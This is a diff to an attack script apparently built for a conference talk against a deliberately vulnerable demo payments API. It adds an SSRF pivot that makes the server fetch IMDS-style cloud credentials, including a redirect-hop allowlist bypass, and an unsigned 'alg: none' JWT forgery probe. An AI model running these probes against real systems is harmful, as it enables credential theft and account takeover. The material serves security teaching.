@@ -9,31 +9,30 @@
  * Console output is built for a live talk: every probe shows
  * intent → wire request → response → loot / finding, plus a running scoreboard.
  *
- * Usage:
+ * Usage (continuous terminal — phases run straight through):
  *   node attack.mjs <API_BASE_URL>
- *   node attack.mjs http://localhost:4000
- *   node attack.mjs https://your-app.azurewebsites.net --drama
+ *   node attack.mjs http://localhost:4000 --reset
+ *   node attack.mjs https://vaultpay-api.vercel.app --reset
  *   node attack.mjs http://localhost:4000 --verbose
  *   node attack.mjs http://localhost:4000 --skip-flood --skip-slow
  *
  * Flags:
  *   --quiet       minimal color + hide wire traces (summary only)
  *   --verbose     print response body previews on every request
- *   --drama       wait for Enter between phases (talk control)
  *   --projector   no dim text, less wire noise, wider spacing (big rooms)
  *   --json        print machine-readable findings at the end
  *   --skip-flood  skip concurrent login flood
  *   --skip-slow   skip the slow-endpoint probe
  *   --reset       POST /api/demo/reset before recon (warm-isolate hygiene)
  *   --gate=TOKEN  send X-VaultPay-Demo (or set DEMO_GATE_TOKEN env)
+ *   --internal=URL  base URL of the SSRF stand-in "internal service"
+ *                   (or set INTERNAL_SERVICE_URL; see scripts/internal-service.mjs)
  *
  * Legal: only attack systems you own or have written permission to test.
  */
 
 import { createHmac } from "node:crypto";
 import net from "node:net";
-import readline from "node:readline/promises";
-import { stdin as input, stdout as output } from "node:process";
 
 const rawArgs = process.argv.slice(2);
 const flags = new Set(rawArgs.filter((a) => a.startsWith("--") && !a.includes("=")));
@@ -42,7 +41,6 @@ const targetArg = positional[0];
 
 const quiet = flags.has("--quiet");
 const verbose = flags.has("--verbose");
-const drama = flags.has("--drama");
 const projector = flags.has("--projector");
 const asJson = flags.has("--json");
 const skipFlood = flags.has("--skip-flood");
@@ -52,10 +50,14 @@ const doReset = flags.has("--reset");
 /** Optional shared secret for gated public demos (server DEMO_GATE_TOKEN). */
 let gateToken = process.env.DEMO_GATE_TOKEN || "";
 let resetToken = process.env.DEMO_RESET_TOKEN || "";
+/** SSRF stand-in target the API can reach but the attacker cannot. */
+let internalService = process.env.INTERNAL_SERVICE_URL || "";
 for (const a of rawArgs) {
   if (a.startsWith("--gate=")) gateToken = a.slice("--gate=".length);
   if (a.startsWith("--reset-token=")) resetToken = a.slice("--reset-token=".length);
+  if (a.startsWith("--internal=")) internalService = a.slice("--internal=".length);
 }
+internalService = internalService.replace(/\/$/, "");
 
 // Wire logging is ON by default for talks; --quiet turns it off.
 // --projector keeps findings readable but trims per-request wire noise.
@@ -63,7 +65,7 @@ const showWire = !quiet && !projector;
 
 if (!targetArg) {
   console.error(
-    "Usage: node attack.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--skip-slow] [--reset] [--gate=TOKEN]"
+    "Usage: node attack.mjs <API_BASE_URL> [--quiet] [--verbose] [--projector] [--json] [--skip-flood] [--skip-slow] [--reset] [--gate=TOKEN] [--internal=URL]"
   );
   process.exit(2);
 }
@@ -107,26 +109,6 @@ const c = {
 
 const startedAt = Date.now();
 
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-
-/**
- * Talk control: --drama waits for Enter so you hold the screen and speak.
- * Non-TTY (piped logs) falls back to a short sleep so automation still works.
- */
-const dramaPause = async () => {
-  if (!drama) return;
-  if (!input.isTTY) {
-    await sleep(400);
-    return;
-  }
-  const rl = readline.createInterface({ input, output });
-  try {
-    await rl.question(`  ${c.dim}[Enter] continue…${c.reset} `);
-  } finally {
-    rl.close();
-  }
-};
-
 function banner() {
   console.log(`
 ${c.red}${c.bold}╔══════════════════════════════════════════════════════════════════════╗
@@ -148,7 +130,7 @@ ${c.red}${c.bold}╔════════════════════
     `${c.bold}Thesis${c.reset}   JWT is not a security model. Frameworks give you almost nothing — and nothing is not a security model.`
   );
   console.log(
-    `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}`
+    `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}  internal=${internalService || "none"}`
   );
   if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0") {
     console.log(
@@ -488,7 +470,6 @@ async function phaseReset() {
   } else {
     info(`Reset → ${res.status} (DEMO_RESET_TOKEN may be required)`);
   }
-  await dramaPause();
 }
 
 async function phaseRecon() {
@@ -515,7 +496,6 @@ async function phaseRecon() {
     narrate("API helpfully advertises its own routes:");
     info(JSON.stringify(root.json.docs));
   }
-  await dramaPause();
 }
 
 async function phaseMissingSecurityHeaders() {
@@ -559,7 +539,6 @@ async function phaseMissingSecurityHeaders() {
   } else {
     ok(`Most security headers present (${needed.length - missing.length}/${needed.length})`);
   }
-  await dramaPause();
 }
 
 /**
@@ -596,7 +575,6 @@ async function phaseCorsMisconfig() {
   } else {
     ok(`CORS restricted (ACA-Origin=${acao})`);
   }
-  await dramaPause();
 }
 
 async function phaseBodyLimit() {
@@ -634,7 +612,6 @@ async function phaseBodyLimit() {
     info(`Large body probe error: ${err.message}`);
     record("INFO", "Large body probe did not complete", err.message, { kind: "misconfig" });
   }
-  await dramaPause();
 }
 
 async function phaseNoRateLimitFlood() {
@@ -693,7 +670,6 @@ async function phaseNoRateLimitFlood() {
       owasp: "API4",
     });
   }
-  await dramaPause();
 }
 
 async function phasePathTraversal() {
@@ -742,7 +718,6 @@ async function phasePathTraversal() {
   } else {
     ok("Path traversal did not yield secrets (unexpected for this demo)");
   }
-  await dramaPause();
 }
 
 async function phaseOpenRedirect() {
@@ -766,7 +741,6 @@ async function phaseOpenRedirect() {
   } else {
     ok(`Redirect not open (status ${res.status}, location=${loc || "none"})`);
   }
-  await dramaPause();
 }
 
 /** Classic cloud IMDS URL (demo teaching target — may fail on CF/Vercel). */
@@ -860,6 +834,92 @@ async function probeMetadataEgress(opts = { proxyAlive: true }) {
   );
 }
 
+/**
+ * SSRF pivot against a stand-in "internal service".
+ *
+ * Real IMDS is unreachable from Workers/Vercel, so the honest local version of
+ * the same attack uses a service the API can reach and the attacker cannot:
+ * `scripts/internal-service.mjs`, bound to loopback on its own port. It serves
+ * IAM-shaped JSON at an IMDS-style path plus an open redirector.
+ *
+ * Two probes:
+ *  1. direct  — proxy fetches the internal URL
+ *  2. hop     — proxy fetches a PUBLIC-looking URL that 302s to the internal
+ *               one. `/api/proxy` uses `redirect: "follow"`, so a first-URL
+ *               allowlist would pass this. The check has to run per hop.
+ *
+ * @param {{ proxyAlive: boolean }} opts
+ */
+async function probeInternalPivot(opts = { proxyAlive: true }) {
+  if (!internalService) return;
+  if (!opts.proxyAlive) {
+    info("Skipping internal-pivot probe — open proxy endpoint not available");
+    return;
+  }
+
+  const credsPath = "/latest/meta-data/iam/security-credentials/vaultpay-demo-role";
+  const internalUrl = `${internalService}${credsPath}`;
+
+  narrate(`Reachability check: can WE hit ${internalService} directly?`);
+  let attackerReach = false;
+  try {
+    const direct = await fetch(`${internalService}/health`, {
+      signal: AbortSignal.timeout(2500),
+    });
+    attackerReach = direct.ok;
+  } catch {
+    attackerReach = false;
+  }
+  if (attackerReach) {
+    // Laptop demo: attacker and server share a host, so we cannot *simulate*
+    // unroutability. Say what is and isn't being modelled — the mechanic below
+    // (server fetches a URL you chose, hands you the body) is the real part.
+    info("Laptop run: attacker and API share a host, so this service is reachable from here too");
+    info("On a real deployment it sits on a private subnet — unroutable from your seat, one hop from the server");
+  } else {
+    ok("Attacker cannot reach the internal service directly — only the server can");
+  }
+
+  narrate(`Asking the SERVER to fetch it instead: ${internalUrl}`);
+  const pivot = await http("GET", `/api/proxy?url=${encodeURIComponent(internalUrl)}`, {
+    timeoutMs: 8_000,
+    label: "ssrf-internal",
+  });
+  const body = (pivot.text || "").replace(/\s+/g, " ").trim();
+  if (pivot.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(body)) {
+    bad("Server fetched an internal-only service and handed us the response");
+    loot("internal-creds", body.slice(0, 180));
+    record(
+      "CRITICAL",
+      "SSRF pivot to internal-only service",
+      "Server-side fetch has no egress policy: it reaches a service the client cannot, and returns the body verbatim (stand-in for cloud IMDS)",
+      { kind: "junior-code", owasp: "API7" }
+    );
+  } else {
+    info(`Internal pivot → ${pivot.status} ${body.slice(0, 80)}`);
+  }
+
+  narrate("Now the bypass: a public-looking URL that 302s to the internal one…");
+  const hopUrl = `${internalService}/redirect?to=${encodeURIComponent(credsPath)}`;
+  const hop = await http("GET", `/api/proxy?url=${encodeURIComponent(hopUrl)}`, {
+    timeoutMs: 8_000,
+    label: "ssrf-redirect-hop",
+  });
+  const hopBody = (hop.text || "").replace(/\s+/g, " ").trim();
+  if (hop.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(hopBody)) {
+    bad("Redirect hop landed on the internal service — first-URL allowlists lose here");
+    loot("hop-creds", hopBody.slice(0, 140));
+    record(
+      "HIGH",
+      "SSRF redirect-hop bypass (redirect: follow, no per-hop revalidation)",
+      "Checking only the URL the user supplied is not enough — fetch follows 3xx and the final hop is never revalidated",
+      { kind: "junior-code", owasp: "API7" }
+    );
+  } else {
+    info(`Redirect-hop probe → ${hop.status}`);
+  }
+}
+
 async function phaseSsrfProxy() {
   step("Open proxy / SSRF on /api/proxy (no login)");
   intent(
@@ -947,7 +1007,7 @@ async function phaseSsrfProxy() {
   }
 
   await probeMetadataEgress({ proxyAlive });
-  await dramaPause();
+  await probeInternalPivot({ proxyAlive });
 }
 
 async function phaseStackAndEcho() {
@@ -1017,7 +1077,6 @@ async function phaseStackAndEcho() {
       ok(`HTML echo probes did not prove reflection (mild=${mildRes.status} noisy=${echo.status})`);
     }
   }
-  await dramaPause();
 }
 
 async function phaseSlowTimeout() {
@@ -1047,7 +1106,6 @@ async function phaseSlowTimeout() {
   } else {
     info(`slow probe status=${res.status} elapsed=${res.ms}ms`);
   }
-  await dramaPause();
 }
 
 async function phaseUnauthDataTheft() {
@@ -1121,7 +1179,6 @@ async function phaseUnauthDataTheft() {
       { kind: "junior-code", owasp: "API3" }
     );
   }
-  await dramaPause();
 }
 
 async function phaseAccountEnumeration() {
@@ -1151,30 +1208,40 @@ async function phaseAccountEnumeration() {
   } else {
     ok("Login errors are uniform");
   }
-  await dramaPause();
+}
+
+/** Seed accounts that exist on every cold start / isolate. */
+const DEMO_CREDENTIALS = [
+  { email: "alice@example.com", password: "password123" },
+  { email: "bob@example.com", password: "bobsecret" },
+  { email: "admin@vaultpay.demo", password: "admin123" },
+];
+
+/**
+ * Log in with the first seed account that works.
+ * @param {{ silent?: boolean }} [opts]
+ * @returns {Promise<{ email: string, password: string, token: string, user: any } | null>}
+ */
+async function demoLogin(opts = {}) {
+  for (const cred of DEMO_CREDENTIALS) {
+    if (!opts.silent) narrate(`Trying demo login ${cred.email}…`);
+    const res = await http("POST", "/api/auth/login", {
+      body: cred,
+      label: `login:${cred.email}`,
+      silent: Boolean(opts.silent),
+    });
+    if (res.status === 200 && res.json?.token) {
+      return { ...cred, token: res.json.token, user: res.json.user };
+    }
+  }
+  return null;
 }
 
 async function phaseAuthzAndForgery() {
   step("Login, BOLA, mass assignment, admin, JWT forge");
   intent("JWT proves someone logged in. It does not decide what they may read or write.");
 
-  const candidates = [
-    { email: "alice@example.com", password: "password123" },
-    { email: "bob@example.com", password: "bobsecret" },
-    { email: "admin@vaultpay.demo", password: "admin123" },
-  ];
-  let loginOk = null;
-  for (const cred of candidates) {
-    narrate(`Trying demo login ${cred.email}…`);
-    const res = await http("POST", "/api/auth/login", {
-      body: cred,
-      label: `login:${cred.email}`,
-    });
-    if (res.status === 200 && res.json?.token) {
-      loginOk = { ...cred, token: res.json.token, user: res.json.user };
-      break;
-    }
-  }
+  const loginOk = await demoLogin();
   if (!loginOk) {
     bad("Could not login with demo credentials — skipping authz chain");
     return;
@@ -1280,6 +1347,33 @@ async function phaseAuthzAndForgery() {
     );
   }
 
+  // One probe we EXPECT to fail. jsonwebtoken v9 defaults to an HS* allowlist
+  // for string secrets, so `alg: none` is rejected without the app configuring
+  // anything. Worth showing: the save came from a library maintainer's breaking
+  // change, not from the developer knowing to ask for it.
+  narrate('Trying the classic "alg": "none" unsigned-token forgery…');
+  const noneToken = `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64url(
+    JSON.stringify({ sub: 3, email: "admin@vaultpay.demo", role: "admin", name: "None Admin" })
+  )}.`;
+  const noneRes = await http("GET", "/api/me", {
+    headers: { Authorization: `Bearer ${noneToken}` },
+    label: "jwt-alg-none",
+  });
+  if (noneRes.status === 200) {
+    bad("Server accepted an UNSIGNED alg:none token");
+    record(
+      "CRITICAL",
+      "Unsigned JWT (alg:none) accepted",
+      "Verification did not pin an algorithm allowlist",
+      { kind: "junior-code", owasp: "API2" }
+    );
+  } else {
+    ok(
+      `alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`
+    );
+    info("You did not configure this. A library maintainer did. That is the whole talk.");
+  }
+
   if (stolen.jwtSecret) {
     narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
     const admin =
@@ -1317,7 +1411,6 @@ async function phaseAuthzAndForgery() {
   } else {
     info("No JWT secret recovered — skip forgery");
   }
-  await dramaPause();
 }
 
 async function phaseSettingsMerge() {
@@ -1353,7 +1446,6 @@ async function phaseSettingsMerge() {
       silent: !verbose,
     });
   }
-  await dramaPause();
 }
 
 async function phaseRawHeaderAbuse() {
@@ -1399,7 +1491,6 @@ async function phaseRawHeaderAbuse() {
       { kind: "framework-gap" }
     );
   }
-  await dramaPause();
 }
 
 function printReport() {
